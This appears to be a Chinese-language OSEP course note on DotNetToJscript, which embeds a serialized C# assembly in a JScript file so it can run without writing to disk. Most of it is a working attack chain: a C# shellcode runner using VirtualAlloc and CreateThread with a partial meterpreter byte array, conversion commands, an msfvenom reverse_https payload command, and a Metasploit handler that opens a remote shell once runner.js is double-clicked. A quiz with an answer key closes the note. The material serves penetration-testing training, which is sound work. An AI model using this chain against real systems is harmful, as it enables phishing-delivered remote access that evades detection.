---
title: OSEP-04-DotNetToJscript
description: '04-JScript攻击 | 04-DotNetToJscript'
pubDate: 2026-01-30T00:00:31+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
  - Phishing
---

# Module 4: Windows Script Host 攻击

## 第三节：DotNetToJscript - 在 Jscript 中执行 C# 代码

### 为什么需要 DotNetToJscript？

Jscript 本身无法直接调用 Win32 API，这限制了我们的攻击能力。但通过 **DotNetToJscript**，我们可以：

- 在 Jscript 中嵌入并执行 C# 代码
- 通过 C# 调用任意 Win32 API
- 实现内存中执行 shellcode
- 绑定文件落地检测

```
传统 Jscript Dropper:
Jscript → 下载 EXE → 保存到磁盘 → 执行
                         ↑
                    容易被检测

DotNetToJscript:
Jscript → 加载 C# 程序集 → 内存中执行 shellcode
                              ↑
                         无文件落地
```

---

## 一、DotNetToJscript 原理

### 1.1 工作流程

```
┌─────────────────┐
│  C# 源代码      │
│  (TestClass.cs) │
└────────┬────────┘
         │ 编译
         ▼
┌─────────────────┐
│  .NET 程序集    │
│  (.dll 文件)    │
└────────┬────────┘
         │ DotNetToJscript 转换
         ▼
┌─────────────────┐
│  Jscript 文件   │
│  (内嵌 Base64   │
│   序列化程序集) │
└────────┬────────┘
         │ 执行
         ▼
┌─────────────────┐
│  反序列化并     │
│  执行 C# 代码   │
└─────────────────┘
```

### 1.2 核心技术

DotNetToJscript 利用了 .NET 的序列化机制：

1. **BinaryFormatter**: 将 .NET 对象序列化为二进制格式
2. **Base64 编码**: 将二进制数据嵌入到 Jscript 中
3. **反序列化执行**: 在运行时反序列化并实例化对象

---

## 二、环境准备

### 2.1 获取 DotNetToJscript

```bash
# 方法 1: 从 GitHub 下载
git clone https://github.com/tyranid/DotNetToJScript.git

# 方法 2: 使用课程提供的版本
# 位于 C:\Tools\DotNetToJscript-master.zip
```

### 2.2 Visual Studio 项目结构

```
DotNetToJscript 解决方案
│
├── DotNetToJscript (主程序)
│   └── 将 .NET 程序集转换为 Jscript
│
└── ExampleAssembly (示例程序集)
    └── TestClass.cs  ← 我们要修改的文件
```

---

## 三、创建简单的 C# 程序集

### 3.1 默认的 TestClass.cs

```csharp
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

[ComVisible(true)]
public class TestClass
{
    public TestClass()
    {
        // 构造函数 - Jscript 会调用这里
        MessageBox.Show("Test", "Test", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```

**关键点**：
- `[ComVisible(true)]` - 使类对 COM 可见，Jscript 需要这个
- 构造函数 `TestClass()` - Jscript 实例化时会执行这里的代码

### 3.2 修改为执行命令

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    public TestClass()
    {
        // 执行 cmd.exe
        Process.Start("cmd.exe");
    }
}
```

---

## 四、编译和转换

### 4.1 编译 ExampleAssembly

1. 在 Visual Studio 中打开解决方案
2. 选择 **Release** 模式
3. 右键 ExampleAssembly → Build
4. 输出文件: `ExampleAssembly.dll`

### 4.2 使用 DotNetToJscript 转换

```cmd
:: 基本用法
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o output.js

:: 参数说明
:: --lang=Jscript  输出格式 (Jscript/VBScript/VBA)
:: --ver=v4        .NET Framework 版本
:: -o output.js    输出文件名

:: 生成 VBScript
DotNetToJScript.exe ExampleAssembly.dll --lang=VBScript --ver=v4 -o output.vbs

:: 生成 VBA (用于 Office 宏)
DotNetToJScript.exe ExampleAssembly.dll --lang=VBA --ver=v4 -o output.vba
```

---

## 五、生成的 Jscript 代码分析

### 5.1 整体结构

```javascript
// 1. 辅助函数
function setversion() { ... }
function base64ToStream(b) { ... }

// 2. Base64 编码的程序集
var serialized_obj = "AAEAAAD/////AQAAAA...";

// 3. 入口类名
var entry_class = 'TestClass';

// 4. 主执行逻辑
try {
    setversion();
    var stm = base64ToStream(serialized_obj);
    var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
    var al = new ActiveXObject('System.Collections.ArrayList');
    var d = fmt.Deserialize_2(stm);
    al.Add(undefined);
    var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
} catch (e) {
    debug(e.message);
}
```

### 5.2 关键函数解析

```javascript
// 设置 .NET 版本
function setversion() {
    new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}

// Base64 解码
function base64ToStream(b) {
    var enc = new ActiveXObject("System.Text.ASCIIEncoding");
    var length = enc.GetByteCount_2(b);
    var ba = enc.GetBytes_4(b);
    var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
    ba = transform.TransformFinalBlock(ba, 0, length);
    var ms = new ActiveXObject("System.IO.MemoryStream");
    ms.Write(ba, 0, (length / 4) * 3);
    ms.Position = 0;
    return ms;
}
```

### 5.3 执行流程

```javascript
// 1. 设置 .NET 版本
setversion();

// 2. 解码 Base64 数据
var stm = base64ToStream(serialized_obj);

// 3. 创建 BinaryFormatter 反序列化器
var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');

// 4. 反序列化程序集
var d = fmt.Deserialize_2(stm);

// 5. 创建空参数数组
var al = new ActiveXObject('System.Collections.ArrayList');
al.Add(undefined);

// 6. 动态调用并创建实例
var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
// CreateInstance 会调用 TestClass 的构造函数
```

---

## 六、C# 中调用 Win32 API

### 6.1 P/Invoke 基础

```csharp
using System;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    // 导入 Win32 API
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);

    public TestClass()
    {
        // 调用 Win32 MessageBox
        MessageBox(IntPtr.Zero, "Hello from C#!", "Test", 0);
    }
}
```

### 6.2 常用 Win32 API 导入

```csharp
using System;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    // 内存分配
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    // 创建线程
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    // 等待线程
    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    // 内存保护修改
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    public TestClass()
    {
        // 在这里使用这些 API
    }
}
```

---

## 七、Shellcode Runner

### 7.1 完整的 C# Shellcode Runner

```csharp
using System;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public TestClass()
    {
        // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f csharp
        byte[] buf = new byte[630] {
            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
            // ... 省略 ...
            0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
        };

        int size = buf.Length;

        // 分配可执行内存
        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        // 复制 shellcode
        Marshal.Copy(buf, 0, addr, size);

        // 创建线程执行
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        // 等待执行完成
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
```

### 7.2 内存分配参数说明

```csharp
// VirtualAlloc 参数
IntPtr addr = VirtualAlloc(
    IntPtr.Zero,    // lpAddress: NULL 让系统选择地址
    0x1000,         // dwSize: 分配大小 (4096 字节)
    0x3000,         // flAllocationType: MEM_COMMIT | MEM_RESERVE
    0x40            // flProtect: PAGE_EXECUTE_READWRITE
);

// 常用内存保护常量
// 0x02 = PAGE_READONLY
// 0x04 = PAGE_READWRITE
// 0x10 = PAGE_EXECUTE
// 0x20 = PAGE_EXECUTE_READ
// 0x40 = PAGE_EXECUTE_READWRITE  ← shellcode 需要这个
```

---

## 八、完整实战流程

### 8.1 生成 Shellcode

```bash
# 在 Kali 上
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.1.100 \
    LPORT=443 \
    -f csharp \
    -o shellcode.txt
```

### 8.2 创建 C# 项目

1. 打开 Visual Studio
2. 打开 DotNetToJscript 解决方案
3. 修改 `ExampleAssembly/TestClass.cs`
4. 粘贴 shellcode 和执行代码
5. 设置平台为 **x64**
6. 编译 (Release 模式)

### 8.3 转换为 Jscript

```cmd
cd C:\Tools
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
```

### 8.4 设置监听器

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 192.168.1.100
set LPORT 443
run
```

### 8.5 执行

双击 `runner.js` 文件，获得 Meterpreter shell。

---

## 九、章节测试

### 选择题

1. DotNetToJscript 的主要作用是什么？
   - A) 将 JavaScript 转换为 C#
   - B) 将 C# 程序集嵌入到 Jscript 中执行
   - C) 编译 Jscript 代码
   - D) 混淆 Jscript 代码

2. `[ComVisible(true)]` 属性的作用是什么？
   - A) 使类可以被序列化
   - B) 使类对 COM 可见，允许 Jscript 调用
   - C) 使类可以被继承
   - D) 使类成为单例

3. 在 C# 中导入 Win32 API 使用什么属性？
   - A) [Import]
   - B) [DllImport]
   - C) [Win32Import]
   - D) [NativeImport]

4. VirtualAlloc 的 0x40 参数表示什么内存保护？
   - A) PAGE_READONLY
   - B) PAGE_READWRITE
   - C) PAGE_EXECUTE_READWRITE
   - D) PAGE_NOACCESS

5. DotNetToJscript 使用什么技术来嵌入程序集？
   - A) 直接嵌入二进制
   - B) Base64 编码 + BinaryFormatter 序列化
   - C) 压缩后嵌入
   - D) 加密后嵌入

### 答案

1-B, 2-B, 3-B, 4-C, 5-B

---

**下一节**：[05-反射式加载.md](/blog/osep/04-jscript攻击/05-反射式加载/) - PowerShell 反射式加载 C# 程序集
